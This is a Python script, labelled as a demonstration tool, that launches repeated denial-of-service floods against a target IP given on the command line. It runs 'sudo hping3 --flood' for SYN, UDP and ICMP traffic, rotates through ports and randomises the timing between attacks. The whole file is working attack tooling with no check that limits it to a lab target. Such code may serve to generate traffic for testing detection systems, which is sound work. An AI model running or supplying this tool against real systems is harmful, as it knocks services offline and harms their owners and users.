#!/usr/bin/env python3
"""
DoS attack generator for demonstration purposes.
"""

import os
import sys
import time
import argparse
import logging
import random
import subprocess
from threading import Thread

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class DoSAttackGenerator:
    """Generate DoS attacks for demonstration purposes."""
    
    def __init__(
        self,
        target_ip: str,
        target_ports: list = [80, 443, 22, 8080],
        attack_duration: int = 30,
        pause_duration: int = 60,
        attack_types: list = ['syn', 'udp', 'icmp']
    ):
        """
        Initialize the DoS attack generator.
        
        Args:
            target_ip: Target IP address
            target_ports: List of target ports
            attack_duration: Duration of each attack in seconds
            pause_duration: Duration of pause between attacks in seconds
            attack_types: List of attack types ('syn', 'udp', 'icmp')
        """
        self.target_ip = target_ip
        self.target_ports = target_ports
        self.attack_duration = attack_duration
        self.pause_duration = pause_duration
        self.attack_types = attack_types
        
        # Check if hping3 is installed
        try:
            subprocess.run(["hping3", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            logger.info("hping3 is available")
            self.hping3_available = True
        except (subprocess.SubprocessError, FileNotFoundError):
            logger.error("hping3 is not installed or not in PATH. Please install it first.")
            self.hping3_available = False
        
        self.running = False
        self.current_process = None
    
    def start_attack_sequence(self, random_sequence: bool = True):
        """
        Start a sequence of attacks with pauses.
        
        Args:
            random_sequence: Whether to randomize attack types and ports
        """
        if not self.hping3_available:
            logger.error("Cannot start attacks because hping3 is not available")
            return
        
        self.running = True
        self.attack_thread = Thread(target=self._attack_loop, args=(random_sequence,))
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        logger.info(f"Started attack sequence against {self.target_ip}")
    
    def stop_attacks(self):
        """Stop all ongoing attacks."""
        self.running = False
        if self.current_process:
            try:
                # Terminate the hping3 process
                self.current_process.terminate()
                self.current_process.wait(timeout=3)
            except:
                pass
        
        # Kill any remaining hping3 processes
        try:
            subprocess.run(["pkill", "-f", "hping3"], stderr=subprocess.PIPE)
        except:
            pass
        
        if hasattr(self, 'attack_thread'):
            self.attack_thread.join(timeout=2.0)
        
        logger.info("All attacks stopped")
    
    def _attack_loop(self, random_sequence: bool):
        """Main loop for running attack sequence."""
        attack_count = 0
        
        while self.running:
            try:
                # Choose attack parameters
                if random_sequence:
                    attack_type = random.choice(self.attack_types)
                    target_port = random.choice(self.target_ports)
                    current_attack_duration = random.randint(max(5, self.attack_duration // 2), self.attack_duration)
                    current_pause_duration = random.randint(max(10, self.pause_duration // 2), self.pause_duration)
                else:
                    attack_type = self.attack_types[attack_count % len(self.attack_types)]
                    target_port = self.target_ports[attack_count % len(self.target_ports)]
                    current_attack_duration = self.attack_duration
                    current_pause_duration = self.pause_duration
                
                attack_count += 1
                
                # Launch the attack
                logger.info(f"Starting {attack_type.upper()} attack #{attack_count} against {self.target_ip}:{target_port} for {current_attack_duration}s")
                self._launch_attack(attack_type, target_port, current_attack_duration)
                
                # Pause between attacks
                if self.running:
                    logger.info(f"Pausing for {current_pause_duration} seconds before next attack")
                    pause_start = time.time()
                    while self.running and (time.time() - pause_start) < current_pause_duration:
                        time.sleep(1)
            
            except Exception as e:
                logger.error(f"Error in attack loop: {e}")
                time.sleep(5)  # Brief pause before retrying
    
    def _launch_attack(self, attack_type: str, target_port: int, duration: int):
        """Launch a specific type of attack."""
        # Build the hping3 command based on attack type
        cmd = ["sudo", "hping3"]
        
        if attack_type == "syn":
            cmd.extend(["-S", "--flood", "-p", str(target_port)])
        elif attack_type == "udp":
            cmd.extend(["--udp", "--flood", "-p", str(target_port)])
        elif attack_type == "icmp":
            cmd.extend(["--icmp", "--flood"])
        else:
            logger.error(f"Unsupported attack type: {attack_type}")
            return
        
        # Add target IP
        cmd.append(self.target_ip)
        
        try:
            # Launch the attack
            self.current_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Run for the specified duration
            start_time = time.time()
            while self.running and (time.time() - start_time) < duration:
                if self.current_process.poll() is not None:
                    logger.warning(f"Attack process terminated unexpectedly with code {self.current_process.returncode}")
                    break
                time.sleep(0.5)
            
            # Terminate the process if it's still running
            if self.current_process.poll() is None:
                self.current_process.terminate()
                try:
                    self.current_process.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    self.current_process.kill()
            
            logger.info(f"Attack completed after {time.time() - start_time:.1f} seconds")
        
        except Exception as e:
            logger.error(f"Error launching attack: {e}")
        finally:
            # Make sure no lingering hping3 processes
            try:
                subprocess.run(["sudo", "pkill", "-f", "hping3"], stderr=subprocess.PIPE)
            except:
                pass

def main():
    """Main function to run the attack generator."""
    parser = argparse.ArgumentParser(description="DoS Attack Generator")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--ports", type=int, nargs="+", default=[80, 443, 22, 8080], help="Target ports")
    parser.add_argument("--attack-duration", type=int, default=30, help="Attack duration in seconds")
    parser.add_argument("--pause-duration", type=int, default=60, help="Pause duration in seconds")
    parser.add_argument("--attack-types", nargs="+", default=['syn', 'udp', 'icmp'], help="Types of attacks to use")
    parser.add_argument("--random", action="store_true", help="Use random attack sequence")
    
    args = parser.parse_args()
    
    generator = DoSAttackGenerator(
        target_ip=args.target,
        target_ports=args.ports,
        attack_duration=args.attack_duration,
        pause_duration=args.pause_duration,
        attack_types=args.attack_types
    )
    
    try:
        generator.start_attack_sequence(random_sequence=args.random)
        logger.info("Attack generator started. Press Ctrl+C to stop.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Attack generator stopped by user")
        generator.stop_attacks()
    except Exception as e:
        logger.error(f"Error in attack generator: {e}")
        generator.stop_attacks()

if __name__ == "__main__":
    main()